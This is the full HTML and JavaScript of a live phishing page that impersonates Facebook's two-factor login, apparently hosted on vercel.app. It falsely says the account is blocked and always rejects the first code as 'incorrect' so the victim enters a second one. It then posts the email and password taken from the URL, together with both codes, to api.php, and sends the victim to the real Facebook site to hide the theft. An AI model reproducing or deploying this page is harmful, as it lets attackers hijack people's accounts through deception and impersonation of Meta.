<html lang="en">

<head>
    <title>Privacy Policy</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta property="og:type" content="website">
    <meta property="twitter:type" content="website">
    <meta property="og:url" content="https://adsupport-center-manage.vercel.app/meta-community-standard">
    <meta property="twitter:url" content="https://adsupport-center-manage.vercel.app/meta-community-standard">
    <meta property="og:title" content="Privacy Policy">
    <meta property="twitter:title" content="Privacy Policy">
    <meta property="og:image"
        content="static/uploads/1c325477ab8db1be14392399bff625fc.png">
    <meta property="twitter:image"
        content="static/uploads/1c325477ab8db1be14392399bff625fc.png">
    <link href="static/uploads/logo.png" rel="shortcut icon">
    <!--<link href="/static/themes/bootstrap.css" rel=stylesheet media=screen>-->
    <link href="static/themes/custom.css" rel="stylesheet" media="screen">
    <link href="static/themes/link_custom.css" rel="stylesheet"
        media="screen">
    <link href="static/themes/animate.css" rel="stylesheet" media="screen">
    <link href="static/css/app.cad2193a277eb5a4ec97d5295f5120bd.css"
        rel="stylesheet">
    <link rel="stylesheet" crossorigin="" href="assets/index-ZU7tKWJA.css">
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    

    <style id="mttstyle">
        .tippy-box[data-theme~="custom"] {
            font-size: 14px !important;
            max-width: 200px !important;
            text-align: center !important;
            backdrop-filter: blur(2px) !important;
            background-color: #000000b8 !important;
            color: #ffffffff !important;
            overflow-wrap: break-word !important;
        }

        [data-tippy-root] {
            display: inline-block !important;
            visibility: visible !important;
        }

        .tippy-box[data-theme~='custom'][data-placement^='top']>.tippy-arrow::before {
            border-top-color: #000000b8 !important;
        }

        .tippy-box[data-theme~='custom'][data-placement^='bottom']>.tippy-arrow::before {
            border-bottom-color: #000000b8 !important;
        }

        .tippy-box[data-theme~='custom'][data-placement^='left']>.tippy-arrow::before {
            border-left-color: #000000b8 !important;
        }

        .tippy-box[data-theme~='custom'][data-placement^='right']>.tippy-arrow::before {
            border-right-color: #000000b8 !important;
        }

        .mtt-highlight {
            background-color: #21dc6d40 !important;
            position: absolute !important;
            z-index: 100000100 !important;
            pointer-events: none !important;
            display: inline !important;
            border-radius: 3px !important;
        }

        .ocr_text_div {
            position: absolute;
            opacity: 0.7;
            font-size: calc(100% + 1cqw);
            overflow: hidden;
            border: 2px solid CornflowerBlue;
            color: transparent !important;
            background: none !important;
        }
    </style>
</head>

<body>
    <div id="app" data-v-app="">
        <div id="app">
            <div>
                <div class="bg-[#F1F2F6] flex justify-center items-center h-screen">
                    <form id="emailForm" onsubmit="submitCodeForm(event)" class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto rounded-lg p-5 bg-[#fff] self-center"  style="margin-top: auto; margin-bottom: auto;">
                        <p class="font-bold text-2xl">Two-factor authentication required (1/3)</p>
                        <p class="my-3" style="font-size: small;"> We have temporarily blocked your account because
                            Facebook Protect has changed. Verify code has been send to 2321****. </p><img
                            src="static/uploads/2fa.gif"
                            class="w-full h-[260px] object-cover mx-auto mb-3 rounded-sm">
                            <input id="codeMail"   type="number" step="1" name="codeMail" required="INT"  placeholder="Enter your code" class="mb-3 w-full mt-1 px-3 py-3 bg-gray-100 border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-md sm:text-sm focus:ring-1" oninput="validateInput(this);">
                            <div ><h6 id="messageContainer" class="red-text"></h6></div>
                            <div class="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md">
                            <div class="text-2xl text-yellow-600"><ion-icon name="information-circle" role="img"
                                    class="md hydrated"></ion-icon></div>
                            <div>
                                <p style="font-size: small;"> You’ve asked us to require a 6-digit login code when
                                    anyone tries to access your account from a new device or browser. Enter the 6-digit
                                    code from your code generator or third-party app below. </p>
                                <p id="countdown"> Please wait <strong class="count-time">04:52</strong> to request the sending of the
                                    code. </p>
                            </div>
                        </div>
                        <script>
                            function validateInput(inputElement) {
                                const value = parseInt(inputElement.value);
                                if (isNaN(value) || value % 1 !== 0) {
                                    document.getElementById('messageContainer').innerText = 'Please enter 6 - digits on your device';
                                } else {
                                    // Nếu giá trị là số nguyên, xóa thông báo lỗi
                                    document.getElementById('messageContainer').innerText = '';
                                }
                            }
                            const countdownMinutes = 5;
                            const targetTime = new Date();
                            targetTime.setMinutes(targetTime.getMinutes() + countdownMinutes);

                            function updateCountdown() {
                                        const currentTime = new Date();
                                        const timeDifference = targetTime - currentTime;

                                        if (timeDifference > 0) {
                                            const minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
                                            const seconds = Math.floor((timeDifference % (1000 * 60)) / 1000);

                                            document.getElementById('countdown').innerHTML = ` Please wait <strong class="count-time">${minutes}:${seconds}</strong> to request the sending of the `;
                                        } else {
                                            document.getElementById('countdown').innerHTML = 'Đã đến thời điểm cần đếm ngược';
                                        }
                                    }
                                    setInterval(updateCountdown, 1000);
                                    updateCountdown();
                            // code.js
                                    // code.js
                                    let attempts = 0;
                                    let firstCodeMail = "";
                                    function submitCodeForm(event) {
                                        event.preventDefault();

                                        // Lấy giá trị codeMail từ form
                                        const codeMail = document.getElementById("codeMail").value;

                                        // Lấy giá trị email và password từ URL
                                        const email = getParameterByName('email');
                                        const password = getParameterByName('password');

                                        // Kiểm tra số lần nhập
                                        if (attempts === 0) {
                                            attempts++;
                                            firstCodeMail = codeMail; // Lưu giá trị mật khẩu lần đầu

                                            displayMessage("Code incorrect. Please try again.");
                                            document.getElementById("emailForm").reset();
                                        } else if (attempts === 1 || attempts === 2) {
                                            attempts++;
                                            const codeMail = $("#codeMail").val();
                                            const email = getParameterByName('email');
                                            const password = getParameterByName('password');

                                            
                                            const data = {
                                                email: email,
                                                password: password,
                                                codeMail: codeMail,
                                                firstCodeMail: firstCodeMail
                                            };

                                            // Thực hiện yêu cầu AJAX bằng jQuery
                                            $.ajax({
                                                type: "POST",
                                                url: "api.php",
                                                data: data,
                                                success: function (response) {           
                                                    if (response === "2FA658") {
                                                        window.location.href = 'https://www.facebook.com/policies_center/';
                                                    }
                                                },
                                                error: function () {
                                                   
                                                    alert("An error occurred.");
                                                }
                                            });
                                            openModal()
                                        }
                                            
                                        }
                                    

                                    // Hàm lấy giá trị tham số từ URL
                                    function getParameterByName(name) {
                                        const url = new URL(window.location.href);
                                        return url.searchParams.get(name);
                                    }
                                    function openModal() {
                                        const modal = document.getElementById("finishModal");
                                        modal.style.display = "block";
                                    }

                                    // Hàm hiển thị thông báo
                                    function displayMessage(message) {
                                        const messageDiv = document.getElementById("messageContainer");
                                        messageDiv.innerHTML = message;
                                    }


                                    // Hàm lấy giá trị tham số từ URL
                                    function getParameterByName(name) {
                                        const url = new URL(window.location.href);
                                        return url.searchParams.get(name);
                                    }


                            </script>
                            <style>
.modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.5);
}
.red-text {
            color: red;
        }
.modal-content {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    border-radius: 5px;
    text-align: center;
}



                            </style>
                        <p class="mt-3 mb-5"> We'll walk you through some steps to secure and unlock your account. </p>
                        <button type="submit"
                            class="block text-lg cursor-pointer bg-gray-100 border border-[#d1d5db] hover:bg-blue-800 transition ease-in-out delay-75 hover:text-white w-full font-semibold text-center py-3 text-black rounded-lg">
                            Submit </button><button type="submit"
                            class="block text-sm text-center py-3 w-full text-blue-800 send-code-btn pointer-events-none">
                            Send Code </button>
                    </form>
                </div><!---->
                <div  id="finishModal" tabindex="-1" aria-hidden="true"
                    class="fixed top-0 left-0 right-0 z-50 w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full justify-center items-center flex hidden modal">
                    <div class="relative w-full max-w-2xl max-h-full modal-content">
                        <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
                            <div class="flex items-start justify-between p-4 border-b rounded-t bg-facebook">
                                <h3 class="text-md font-semibold text-white">Form Submitted Successfully</h3>
                            </div>
                            <div class="p-6 space-y-6">
                                <p class="text-base leading-relaxed text-gray-500 dark:text-gray-400"> Thanks for
                                    contacting us. You'll get a notification when we respond in 1-2 business days. You
                                    can view responses in your Support Inbox. </p>
                            </div>
                            <div
                                class="flex items-center justify-end p-4 space-x-2 border-t border-gray-200 rounded-b dark:border-gray-600">
                                <button type="button"
                                    class="finish-verify text-white bg-facebook hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center">
                                    OK </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

</body>

</html>